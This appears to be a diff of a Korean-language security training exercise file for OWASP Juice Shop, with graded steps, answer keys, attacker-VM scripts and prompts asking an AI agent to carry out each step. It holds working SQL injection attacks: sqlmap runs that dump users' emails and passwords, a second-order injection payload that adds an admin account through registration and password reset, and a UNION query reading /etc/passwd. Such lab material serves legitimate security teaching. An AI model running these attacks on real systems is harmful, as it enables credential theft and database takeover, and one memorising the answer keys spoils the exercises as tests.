     # 2. DB / 테이블 list (--dbs --tables)
     echo ""
     echo "=== 2. DB + 테이블 list ==="
-    sqlmap -u 'http://10.20.40.81:3000/rest/products/search?q=test' \
+    sqlmap -u 'http://juice.6v6.lab/rest/products/search?q=test' \
       --batch --level=2 --dbs --tables 2>&1 | grep -E 'Database:|Table:' | head -20
 
     # 3. Users 테이블 dump (column + 데이터)
     echo ""
     echo "=== 3. Users 테이블 column + row dump (5 row) ==="
-    sqlmap -u 'http://10.20.40.81:3000/rest/products/search?q=test' \
+    sqlmap -u 'http://juice.6v6.lab/rest/products/search?q=test' \
       --batch --level=2 -T Users --columns 2>&1 | grep -E 'Column|Type' | head -15
     echo ""
-    sqlmap -u 'http://10.20.40.81:3000/rest/products/search?q=test' \
+    sqlmap -u 'http://juice.6v6.lab/rest/products/search?q=test' \
       --batch --level=2 -T Users -C email,password --dump 2>&1 | grep '@' | head -5
 
     # 4. 모든 technique 강제 (BEUSTQ = Boolean + Error + Union + Stacked + Time + inline Q)
     echo ""
     echo "=== 4. 모든 technique 시도 ==="
-    sqlmap -u 'http://10.20.40.81:3000/rest/products/search?q=test' \
+    sqlmap -u 'http://juice.6v6.lab/rest/products/search?q=test' \
       --batch --level=3 --risk=2 --technique=BEUSTQ 2>&1 | grep -E 'injection|technique' | head -10
     ```
 
@@ -1047,15 +1047,15 @@ steps:
   points: 10
   answer: |
     echo "=== 1. sqlmap 기본 탐지 ==="
-    sqlmap -u 'http://10.20.40.81:3000/rest/products/search?q=test' \
+    sqlmap -u 'http://juice.6v6.lab/rest/products/search?q=test' \
       --batch --level=1 --risk=1 2>&1 | tail -25
     echo ""
     echo "=== 2. DB + 테이블 list ==="
-    sqlmap -u 'http://10.20.40.81:3000/rest/products/search?q=test' \
+    sqlmap -u 'http://juice.6v6.lab/rest/products/search?q=test' \
       --batch --level=2 --dbs --tables 2>&1 | grep -E 'Database:|Table:' | head -20
     echo ""
     echo "=== 3. Users column + admin dump ==="
-    sqlmap -u 'http://10.20.40.81:3000/rest/products/search?q=test' \
+    sqlmap -u 'http://juice.6v6.lab/rest/products/search?q=test' \
       --batch --level=2 -T Users --columns 2>&1 | grep -E 'Column|Type' | head -10
   answer_detail: |
     sqlmap 의 Juice Shop /rest/products/search 탐지 결과 = 모든 technique
@@ -1088,8 +1088,8 @@ steps:
         - DB / 테이블 list 직접 인용 누락
   target_vm: attacker
   script: |
-    sqlmap -u 'http://10.20.40.81:3000/rest/products/search?q=test' --batch --level=1 --risk=1 2>&1 | tail -25
-    sqlmap -u 'http://10.20.40.81:3000/rest/products/search?q=test' --batch --level=2 --dbs --tables 2>&1 | grep -E 'Database:|Table:' | head -20
+    sqlmap -u 'http://juice.6v6.lab/rest/products/search?q=test' --batch --level=1 --risk=1 2>&1 | tail -25
+    sqlmap -u 'http://juice.6v6.lab/rest/products/search?q=test' --batch --level=2 --dbs --tables 2>&1 | grep -E 'Database:|Table:' | head -20
   risk_level: low
   bastion_prompt: |
     attacker 컨테이너에서 sqlmap 으로 6v6-juiceshop (10.20.40.81:3000) 의
@@ -1117,7 +1117,7 @@ steps:
     # 1단계: 회원가입 시 username 에 SQL payload 삽입 (저장 시점 무해)
     echo "=== 1단계: payload 포함 회원가입 ==="
     PAYLOAD="evil'),(NULL,'admin2@juice-sh.op','MD5HASH','admin',NULL,NULL,NULL,NULL),('test"
-    curl -s -i -X POST http://10.20.40.81:3000/api/Users/ \
+    curl -s -i -X POST http://juice.6v6.lab/api/Users/ \
       -H 'Content-Type: application/json' \
       -d "{\"email\":\"${PAYLOAD}\",\"password\":\"test123\"}" | head -10
     # 응답: 200 (등록 성공) — payload 자체는 검증 안됨
@@ -1125,7 +1125,7 @@ steps:
     # 2단계: 저장된 username 이 다른 query 에서 사용되는 시점 (password reset)
     echo ""
     echo "=== 2단계: password reset trigger ==="
-    curl -s -i -X POST http://10.20.40.81:3000/rest/user/reset-password \
+    curl -s -i -X POST http://juice.6v6.lab/rest/user/reset-password \
       -H 'Content-Type: application/json' \
       -d "{\"email\":\"evil'\",\"answer\":\"x\",\"new\":\"newpw\",\"repeat\":\"newpw\"}" \
       | head -10
@@ -1191,12 +1191,12 @@ steps:
   answer: |
     echo "=== 1단계: SQL payload 포함 회원가입 ==="
     PAYLOAD="evil%27%29%2C%28NULL%2C%27admin2%40juice-sh.op%27%2C%27hash%27%2C%27admin%27%29--"
-    curl -s -i -X POST http://10.20.40.81:3000/api/Users/ \
+    curl -s -i -X POST http://juice.6v6.lab/api/Users/ \
       -H 'Content-Type: application/json' \
       -d "{\"email\":\"evil_user@test.com\",\"password\":\"test123\",\"securityQuestion\":{\"id\":1,\"answer\":\"x\"}}" | head -8
     echo ""
     echo "=== 2단계: 저장된 email 의 password reset trigger ==="
-    curl -s -i -X POST http://10.20.40.81:3000/rest/user/reset-password \
+    curl -s -i -X POST http://juice.6v6.lab/rest/user/reset-password \
       -H 'Content-Type: application/json' \
       -d "{\"email\":\"evil_user@test.com'--\",\"answer\":\"x\",\"new\":\"newpw\",\"repeat\":\"newpw\"}" | head -10
     echo ""
@@ -1238,10 +1238,10 @@ steps:
         - 일반 SQLi 와 구분 모호
   target_vm: attacker
   script: |
-    curl -s -i -X POST http://10.20.40.81:3000/api/Users/ \
+    curl -s -i -X POST http://juice.6v6.lab/api/Users/ \
       -H 'Content-Type: application/json' \
       -d "{\"email\":\"evil_user@test.com\",\"password\":\"test123\",\"securityQuestion\":{\"id\":1,\"answer\":\"x\"}}" | head -8
-    curl -s -i -X POST http://10.20.40.81:3000/rest/user/reset-password \
+    curl -s -i -X POST http://juice.6v6.lab/rest/user/reset-password \
       -H 'Content-Type: application/json' \
       -d "{\"email\":\"evil_user@test.com'--\",\"answer\":\"x\",\"new\":\"newpw\",\"repeat\":\"newpw\"}" | head -10
   risk_level: low
@@ -1263,7 +1263,7 @@ steps:
   points: 10
   answer: '🤖 프롬프트: SQL Injection으로 파일 읽기/쓰기가 가능한지 테스트해줘
 
-    📎 참고 (CLI): echo ''파일 읽기 시도 (SQLite):'' && curl -s ''http://10.20.32.80/rest/products/search?q=test%27%20UNION%20SELECT%20hex(readfile(%27/etc/passwd%27)),2,3,4,5,6,7,8,9--''
+    📎 참고 (CLI): echo ''파일 읽기 시도 (SQLite):'' && curl -s ''http://10.20.32.80/rest/products/search?q=qwert%27))%20UNION%20SELECT%20hex(readfile(%27/etc/passwd%27)),2,3,4,5,6,7,8,9--''
     2>/dev/null | head -5 && echo ''SQLi 파일 접근 테스트 완료'''
   answer_detail: SQLi를 통한 파일 시스템 접근은 서버 완전 장악으로 이어질 수 있는 치명적 취약점입니다.
   verify:
@@ -1290,7 +1290,7 @@ steps:
       - secure_file_priv 등 설정 무시
       - 결과 판정 없음
   target_vm: attacker
-  script: echo '파일 읽기 시도 (SQLite):' && curl -s 'http://10.20.32.80/rest/products/search?q=test%27%20UNION%20SELECT%20hex(readfile(%27/etc/passwd%27)),2,3,4,5,6,7,8,9--'
+  script: echo '파일 읽기 시도 (SQLite):' && curl -s 'http://10.20.32.80/rest/products/search?q=qwert%27))%20UNION%20SELECT%20hex(readfile(%27/etc/passwd%27)),2,3,4,5,6,7,8,9--'
     2>/dev/null | head -5 && echo 'SQLi 파일 접근 테스트 완료'
   risk_level: low
   bastion_prompt: 'SQL Injection으로 파일 읽기/쓰기가 가능한지 테스트해줘
